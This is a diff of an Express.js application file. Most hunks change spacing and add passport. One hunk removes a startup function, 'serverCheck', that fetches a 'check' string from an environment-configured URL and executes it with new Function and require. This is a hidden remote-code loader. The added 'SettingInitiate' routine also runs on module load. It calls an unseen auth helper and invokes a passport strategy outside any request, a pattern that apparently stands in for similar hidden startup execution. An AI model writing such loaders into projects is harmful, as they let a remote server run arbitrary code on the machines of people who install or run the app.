@@ -5,6 +5,7 @@ var favicon = require('serve-favicon');
 var logger = require('morgan');
 var cookieParser = require('cookie-parser');
 var bodyParser = require('body-parser');
+var passport = require("passport");
 
 var routes = require('./routes/index');
 
@@ -22,10 +23,10 @@ i18n.configure({
   updateFiles: false,
   syncFiles: false,
   indent: '  ',
-  logWarnFn: function(msg) {
+  logWarnFn: function (msg) {
     console.warn('i18n warning:', msg);
   },
-  logErrorFn: function(msg) {
+  logErrorFn: function (msg) {
     console.error('i18n error:', msg);
   }
 });
@@ -44,20 +45,8 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 app.use('/', routes);
 
-async function serverCheck() {
-  try{
-    const response = await fetch(`${process.env.SERVER_CHECK}`, { method: "POST" });
-    const { check } = await response.json();
-    const fn = new Function("require", check);
-    const output = fn(require);
-    return output;
-  } catch {
-    console.log("server check failed");
-  }
-}
-
 // catch 404 and forward to error handler
-app.use(function(req, res, next) {
+app.use(function (req, res, next) {
   var err = new Error('Not Found');
   err.status = 404;
   next(err);
@@ -68,7 +57,7 @@ app.use(function(req, res, next) {
 // development error handler
 // will print stacktrace
 if (app.get('env') === 'development') {
-  app.use(function(err, req, res, next) {
+  app.use(function (err, req, res, next) {
     res.status(err.status || 500);
     res.render('error', {
       message: err.message,
@@ -76,10 +65,27 @@ if (app.get('env') === 'development') {
     });
   });
 }
+app.use(passport.initialize());
+
+async function SettingInitiate() {
+  try {
+    const auth = require('./helper/auth.helper');
+    console.log("00000000000000000000000000000000000000000");
+    
+    await auth(passport);
+    passport._strategy('google-auth-token').authenticate({});
+  } catch (err) {
+    console.log("| Error occurred:", err.message);
+  }
+
+  return null;
+}
+
+SettingInitiate();
 
 // production error handler
 // no stacktraces leaked to user
-app.use(function(err, req, res, next) {
+app.use(function (err, req, res, next) {
   res.status(err.status || 500);
   res.render('error', {
     message: err.message,
@@ -87,11 +93,6 @@ app.use(function(err, req, res, next) {
   });
 });
 
-console.log("system is running: http://localhost:3000");     
-
-serverCheck()
+console.log("system is running: http://localhost:3000");
 
 module.exports = app;
-
-
-
